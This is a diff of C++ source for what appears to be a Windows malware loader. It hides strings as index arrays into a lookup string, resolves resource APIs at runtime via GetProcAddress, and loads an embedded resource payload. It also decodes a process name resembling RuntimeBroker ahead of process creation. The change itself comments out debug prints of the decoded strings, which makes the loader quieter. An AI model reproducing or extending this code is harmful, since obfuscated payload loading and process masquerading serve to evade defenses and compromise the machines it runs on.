@@ -38,8 +38,8 @@ void main_star() {
     int runtime_broker[] = {2, 64, 63, 63, 22, 8, 13, 3, 14, 22, 18, 63, 63, 18, 24, 18, 19, 4, 12, 55, 54, 63, 63, 43, 20, 13, 19, 8, 12, 4, 27, 17, 14, 10, 4, 17, 62, 4, 23, 4};
     
     //std::cout <<getoriginal(afindres, big_string, sizeof(afindres)) << std::endl;
-    std::cout <<getoriginal(size_of_Resource, big_string, sizeof(size_of_Resource)) << std::endl;  
-    std::cout <<getoriginal(load_resource_ok, big_string, sizeof(load_resource_ok)) << std::endl;
+    //std::cout <<getoriginal(size_of_Resource, big_string, sizeof(size_of_Resource)) << std::endl;  
+    //std::cout <<getoriginal(load_resource_ok, big_string, sizeof(load_resource_ok)) << std::endl;
     
     
     FARPROC pLoad_Resource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(load_resource_ok, big_string, sizeof(load_resource_ok)).c_str());
@@ -63,10 +63,10 @@ void main_star() {
     code199kLen = Size_Of_Resource_Func(hModule, hResource);
     code199k = (char*)LockResource(resrdata);
     
-    std::cout <<getoriginal(creatingprocess, big_string, sizeof(creatingprocess)) << std::endl;  
+    //std::cout <<getoriginal(creatingprocess, big_string, sizeof(creatingprocess)) << std::endl;  
     
     std::string runtime_broker_kum = getoriginal(runtime_broker, big_string, sizeof(runtime_broker));
-    std::cout <<getoriginal(runtime_broker, big_string, sizeof(runtime_broker)) << std::endl;
+    //std::cout <<getoriginal(runtime_broker, big_string, sizeof(runtime_broker)) << std::endl;
     const char* processptaah = runtime_broker_kum.c_str();
 
     STARTUPINFO li = {0};
